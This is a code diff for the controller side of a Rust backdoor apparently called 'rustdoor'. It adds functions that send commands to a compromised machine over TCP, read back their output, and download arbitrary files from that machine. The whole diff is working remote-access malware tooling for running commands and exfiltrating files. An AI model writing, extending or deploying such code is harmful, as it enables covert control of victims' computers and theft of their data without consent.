@@ -1,13 +1,20 @@
-use rustdoor::communication::messages::{
-    RunCommandRequest
-};
+use rustdoor::communication::messages::{RunCommandRequest, MessageType, RunCommandResponse, MessageTypes, DownloadFileResponse};
 use std::io::{Error, Write};
 use std::net::TcpStream;
+use serde::Serialize;
 
-use crate::commanding::get_response;
 use rustdoor::communication::serialization::serialize_message;
+use rustdoor::communication::messages::{DownloadFileRequest, };
+use rustdoor::communication::server::get_message;
 
+fn send_request(req: impl Serialize + MessageType, stream: &mut TcpStream) -> Result<(), Error> {
+    let msg = serialize_message(req).unwrap();
 
+    println!("Sending buffer {:?}", msg);
+    stream.write_all(&msg).expect("Could not write data to stream");
+    println!("Sent message, awaiting reply...");
+    Ok(())
+}
 
 pub fn run_command(command: String, mut stream: &mut TcpStream) -> Result<(), Error> {
     println!("Running command {} through backdoor.", command);
@@ -15,13 +22,34 @@ pub fn run_command(command: String, mut stream: &mut TcpStream) -> Result<(), Er
         command,
         async_run: false,
     };
-    let msg = serialize_message(req).unwrap();
+    send_request(req, stream).expect("Could not send request");
 
-    println!("Sending buffer {:?}", msg);
-    stream.write_all(&msg).expect("Could not write data to stream");
-    println!("Sent message, awaiting reply...");
+    let response = get_message(&mut stream).expect("Could not get message from stream");
+    if response.message_type != MessageTypes::RunCommandResponse as u8 {
+        panic!(format!("Got unexpected response type {}", response.message_type));
+    }
+    println!("Response got: {:?}", response);
+    let response: RunCommandResponse = ron::de::from_bytes(&response.serialized_message).expect("Could not deserialize message");
+    println!("Output: {:?} ", &response.output);
+    println!("Error info: {:?}", response.error_info);
 
-    let _response = get_response(&mut stream);
+    Ok(())
+}
+
+pub fn download_file(remote_path: String, local_path: String, mut stream: &mut TcpStream) -> Result<(), Error> {
+    let req = DownloadFileRequest {
+        path: remote_path
+    };
+    send_request(req, stream).expect("Could not send request");
+
+    let response = get_message(&mut stream).expect("Could not get message from stream");
+    if response.message_type != MessageTypes::DownloadFileResponse as u8 {
+        panic!(format!("Got unexpected response type {}", response.message_type));
+    }
+    let response: DownloadFileResponse = ron::de::from_bytes(&response.serialized_message).expect("Could not deserialize message");
+    println!("File data: {}", std::str::from_utf8(&response.file_data).unwrap());
+    println!("Error info: {:?}", response.error_info);
+
 
     Ok(())
 }
